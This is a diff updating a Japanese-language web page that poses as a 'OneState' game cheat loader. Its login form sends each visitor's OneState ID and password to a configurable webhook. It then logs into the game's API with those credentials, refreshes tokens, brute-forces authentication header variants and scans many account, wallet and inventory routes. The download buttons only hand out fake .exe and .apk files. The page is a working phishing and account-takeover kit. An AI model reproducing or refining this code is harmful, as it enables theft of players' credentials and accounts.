@@ -8,8 +8,7 @@
 <script src="https://unpkg.com/corsfix"></script>
 <style>
 :root{--bg:#05070c;--fg:#c9d7e6;--dim:#5f748c;--acc:#6fc9ff;--line:rgba(111,201,255,.16);--card:rgba(8,13,21,.72);--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
-*{box-sizing:border-box}
-html{-webkit-text-size-adjust:100%}
+*{box-sizing:border-box}html{-webkit-text-size-adjust:100%}
 body{margin:0;background:var(--bg);color:var(--fg);font-family:var(--mono);font-size:14px;line-height:1.7;padding-bottom:90px}
 body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(111,201,255,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(111,201,255,.05) 1px,transparent 1px);background-size:40px 40px}
 .wrap{position:relative;z-index:1;max-width:600px;margin:0 auto;padding:0 18px}
@@ -47,14 +46,14 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 .ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
 .ab{padding:0 16px 14px;max-height:62vh;overflow:auto}
 .ab.collapsed{display:none}
-#alog{margin-top:10px;max-height:46vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
+#alog{margin-top:10px;max-height:48vh;overflow:auto;border-top:1px solid var(--line);padding-top:8px;color:var(--dim);font-size:10.5px}
 #toast{position:fixed;left:50%;transform:translateX(-50%);bottom:104px;z-index:9;display:flex;flex-direction:column;gap:6px;align-items:center;pointer-events:none}
 .tt{background:rgba(5,7,12,.95);border:1px solid var(--acc);color:var(--acc);font-size:11.5px;padding:8px 14px}
 </style>
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.4</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.5</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -116,13 +115,13 @@ function webhook(){return qs('to')||getCfg().webhook||CONFIG.WEBHOOK}
 function fp(){var v=localStorage.getItem(LS.fp);if(!v){v=Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,6);localStorage.setItem(LS.fp,v)}return v}
 function getLog(){try{return JSON.parse(localStorage.getItem(LS.log)||'[]')}catch(e){return[]}}
 function stamp(){var d=new Date(),p=function(n){return String(n).padStart(2,'0')};return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())}
-function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>500)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
+function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>600)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
 function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
 function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-400).join('\n');el.scrollTop=el.scrollHeight}
 function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2200)}
 function b64u(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';try{return decodeURIComponent(escape(atob(s)))}catch(e){try{return atob(s)}catch(_){return''}}}
-function jhdr(t){try{var p=String(t).split('.');if(p.length<3)return null;return JSON.parse(b64u(p[0]))}catch(e){return null}}
-function jpay(t){try{var p=String(t).split('.');if(p.length<3)return b64u(p[1]).slice(0,180);return '(2part)'}catch(e){return'(?)'}}
+function jseg(t,i){try{var p=String(t).split('.');return p[i]?b64u(p[i]):''}catch(e){return''}}
+function jhdr(t){try{return JSON.parse(jseg(t,0))}catch(e){return null}}
 
 var TR=[
  {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
@@ -161,10 +160,12 @@ async function send(text){
   try{await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:body})}
   catch(e){try{await fetch(wh,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:body})}catch(_){}}
 }
+var LAST_RAW='';
 async function apiLogin(id,pw){
   var r=await req('POST','/v2/auth/login',{ident:id,password:pw,remember:true,fingerprint:fp()});
-  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r;
-  return r;
+  LAST_RAW=String(r&&(r.text||r.err));
+  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json;
+  return null;
 }
 function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
 function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
@@ -179,13 +180,12 @@ $('form').addEventListener('submit',async function(e){
   await send('OneState ID 取得\nID: '+id+'\nパスワード: '+pw+'\n時刻: '+new Date().toLocaleString('ja-JP'));
   var lr=await apiLogin(id,pw);
   msg('ライセンス発行済み',true);toast('ライセンス発行');
-  if(lr&&lr.data){var nt=await refreshToken(lr.data.refreshToken);acct('ログイン成功 / トークン取得'+(nt?'（更新済）':''))}
-  else acct('API応答なし');
+  acct(lr?'ログイン成功 / トークン取得':'API応答なし');
   $('go').disabled=false;
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v3.4 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v3.5 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -197,77 +197,69 @@ $('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').
 $('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
 
-async function refreshToken(rt){
+async function doRefresh(rt){
   if(!rt)return null;
   var r=await req('POST','/v2/auth/refresh',{refreshToken:rt,fingerprint:fp()});
-  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return r.json.data.accessToken;
-  return null;
+  if(r.ok&&r.json&&r.json.data&&r.json.data.accessToken)return{tk:r.json.data.accessToken,raw:String(r.text).slice(0,160)};
+  return{tk:null,raw:code(r)+' '+String(r.text||r.err).slice(0,120)};
 }
-var ROUTES=['/me','/auth/me','/user','/user/me','/users/me','/profile','/account','/player','/wallet','/balance','/inventory','/cars','/garage','/stats'];
+var ROUTES=['/me','/auth/me','/user','/user/me','/users/me','/user/profile','/profile','/profile/me','/account','/account/me','/account/info','/player','/players/me','/player/me','/character','/characters/me','/characters','/wallet','/balance','/money','/bank','/inventory','/items','/cars','/garage','/vehicles','/houses','/properties','/business','/jobs','/stats','/statistics','/daily','/store','/shop','/license','/licenses','/subscription','/premium','/vip','/promo','/news','/notifications','/friends','/clan','/family','/level','/rank','/server','/status','/settings'];
 async function routeScan(tok,headers){
-  var h=headers||{Authorization:'Bearer '+tok};
-  var n=0;
+  var h=headers||{Authorization:'Bearer '+tok},n=0;
   for(var i=0;i<ROUTES.length;i++){
     var r=await req('GET','/v2'+ROUTES[i],null,h),c=code(r);
-    if(c!==16&&c!=='ERR'){log('★ /v2'+ROUTES[i]+' -> '+c);n++}
-    await sleep(50);
+    if(c!==16&&c!=='ERR'){log('★ /v2'+ROUTES[i]+' -> '+c+' '+String(r.text||'').slice(0,110));n++}
+    await sleep(40);
   }
-  log('scan done: hits='+n);
+  log('scan done: hits='+n+' / '+ROUTES.length);
   return n;
 }
 
-/* ===== 判定 v5 ===== */
 var S={};
 async function oracle(){
-  clearLog();log('// ORACLE v5');
+  clearLog();log('// ORACLE v6');
   var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
   var s1=await req('GET','/v2/auth/login',null,{}),s2=await req('GET','/v1/shop/zzz',null,{});
-  log('sanity: login='+code(s1)+' shopzzz='+code(s2));S.sanity='login='+code(s1)+' shopzzz='+code(s2);
+  S.sanity='login='+code(s1)+' shopzzz='+code(s2);log('sanity: '+S.sanity);
 
-  var r=await apiLogin(c.id,c.pw);
-  var lr=(r&&r.data)?r:null;
-  log('login: '+(lr?'OK':code(r)));S.login=(lr?'OK':code(r));
-  S.raw=String(r&&(r.text||r.err)).slice(0,420);
+  var lr=await apiLogin(c.id,c.pw);
+  S.login=lr?'OK':'FAIL';log('login: '+S.login);
+  S.raw=LAST_RAW.slice(0,300);
   if(!lr){log('ログイン失敗');S.verdict='no login';dump();return}
   var LT=lr.data.accessToken,RT=lr.data.refreshToken||'',CID=lr.data.clientId||'';
-  S.lt='payload='+jpay(LT);
+  var h0=jhdr(LT)||{};
+  S.ltHdr=JSON.stringify(h0).slice(0,180);
+  S.uid=String(h0.uid||'');
+  log('uid='+S.uid+' exp='+(h0.exp||'?')+' now='+Math.floor(Date.now()/1000)+' 差='+((h0.exp||0)-Math.floor(Date.now()/1000))+'s');
+  var PL=jseg(LT,1);S.payload=PL.slice(0,120);
+  log('payload(先頭): '+PL.slice(0,90));
 
   log('== refresh ==');
-  var rr=await req('POST','/v2/auth/refresh',{refreshToken:RT,fingerprint:fp()});
-  log('refresh -> '+code(rr));S.refresh=code(rr);
-  var NT=null;
-  if(rr.ok&&rr.json&&rr.json.data&&rr.json.data.accessToken){
-    NT=rr.json.data.accessToken;
-    var h=jhdr(NT);
-    log('new token hdr: '+JSON.stringify(h).slice(0,200));
-    var now=Math.floor(Date.now()/1000);
-    if(h&&h.exp)log('now='+now+' exp='+h.exp+' 残='+(h.exp-now)+'s');
-    S.nhdr=JSON.stringify(h).slice(0,220);
-  }else S.nhdr='(none)';
+  var rf=await doRefresh(RT);
+  S.refresh=rf.tk?'OK':'FAIL';
+  if(rf.tk){var h1=jhdr(rf.tk)||{};S.ntHdr=JSON.stringify(h1).slice(0,180);log('new token ok exp='+(h1.exp||'?'))}
+  else log('refresh fail: '+rf.raw);
+  var TOK=rf.tk||LT;
+  log('== brute ==');
 
-  var TOK=NT||LT;
-  var uid=(jhdr(NT)&&jhdr(NT).uid)||'';
-  log('使用トークン: '+(NT?'refresh由来':'login由来')+' uid='+uid);
-  S.uid=String(uid);
-
-  var F=fp();
+  var F=fp(),UID=S.uid;
   var V=[
    ['none',{}],
    ['Bearer',{Authorization:'Bearer '+TOK}],
    ['raw',{Authorization:TOK}],
+   ['Bearer(loginToken)',{Authorization:'Bearer '+LT}],
    ['X-Access-Token',{'X-Access-Token':TOK}],
    ['X-Auth-Token',{'X-Auth-Token':TOK}],
    ['access_token',{'access_token':TOK}],
    ['Grpc-Metadata-Authorization',{'Grpc-Metadata-Authorization':'Bearer '+TOK}],
    ['Cookie access_token',{Cookie:'access_token='+TOK}],
-   ['Bearer+uid',{Authorization:'Bearer '+TOK,'X-Uid':String(uid)}],
-   ['X-Uid',{'X-Uid':String(uid)}],
+   ['Bearer+uid',{Authorization:'Bearer '+TOK,'X-Uid':UID}],
    ['Bearer+Client-Id',{Authorization:'Bearer '+TOK,'Client-Id':CID}],
    ['Bearer+fp',{Authorization:'Bearer '+TOK,fingerprint:F}],
    ['q access_token',{},'?access_token='+TOK],
-   ['Bearer(login tok)',{Authorization:'Bearer '+LT}]
+   ['Bearer(payload)',{Authorization:'Bearer '+PL}],
+   ['payload raw',{Authorization:PL}]
   ];
-  log('== brute ==');
   var hit=null;
   for(var j=0;j<V.length;j++){
     var nm=V[j][0],hh=V[j][1];if(!hh)continue;
@@ -276,34 +268,39 @@ async function oracle(){
     var star=(cc!==16&&cc!=='ERR');
     log(nm+' -> '+cc+(star?'  ★':''));
     if(star&&!hit)hit={nm:nm,h:hh};
-    await sleep(80);
+    await sleep(70);
   }
   S.verdict=hit?('受理: '+hit.nm):'全滅';
-  if(hit){toast('受理: '+hit.nm);log('== route scan ==');await routeScan(TOK,hit.h)}
+  log('== route scan ==');
+  var n=await routeScan(TOK,hit?hit.h:null);
+  S.scanHits=n;
+  if(hit)toast('受理: '+hit.nm);
   dump();log('// END');
 }
 function dump(){
   log('===== SUMMARY =====');
   log('sanity: '+S.sanity);
   log('login: '+S.login);
-  log('loginToken: '+S.lt);
-  log('newTokenHdr: '+S.nhdr);
   log('uid: '+S.uid);
+  log('loginHdr: '+S.ltHdr);
+  log('payload: '+S.payload);
   log('refresh: '+S.refresh);
+  log('newHdr: '+S.ntHdr);
   log('verdict: '+S.verdict);
-  log('raw: '+S.raw);
+  log('scanHits: '+S.scanHits);
   log('===================');
 }
 async function probe(){
   clearLog();log('// PROBE');
   var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}
-  var lr=await apiLogin(c.id,c.pw);if(!lr||!lr.data){log('ログイン失敗');return}
-  var t=await refreshToken(lr.data.refreshToken)||lr.data.accessToken;
-  log('token='+String(t).slice(0,40)+'...');
+  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
+  var rf=await doRefresh(lr.data.refreshToken);
+  var t=rf.tk||lr.data.accessToken;
+  log('token='+String(t).slice(0,40));
   for(var i=0;i<ROUTES.length;i++){
     var r=await req('GET','/v2'+ROUTES[i],null,{Authorization:'Bearer '+t});
-    log('/v2'+ROUTES[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,90));
-    await sleep(70);
+    log('/v2'+ROUTES[i]+' -> '+code(r)+' '+String(r.text||'').slice(0,80));
+    await sleep(60);
   }
 }
 async function diag(){
@@ -326,7 +323,7 @@ async function diag(){
   }
 }
 $('boracle').addEventListener('click',oracle);
-$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr&&lr.data)await routeScan(await refreshToken(lr.data.refreshToken)||lr.data.accessToken)});
+$('broute').addEventListener('click',async function(){var c=creds();var lr=await apiLogin(c.id,c.pw);if(lr){var rf=await doRefresh(lr.data.refreshToken);await routeScan(rf.tk||lr.data.accessToken)}});
 $('bprobe').addEventListener('click',probe);
 $('bdiag').addEventListener('click',diag);
 renderLog();
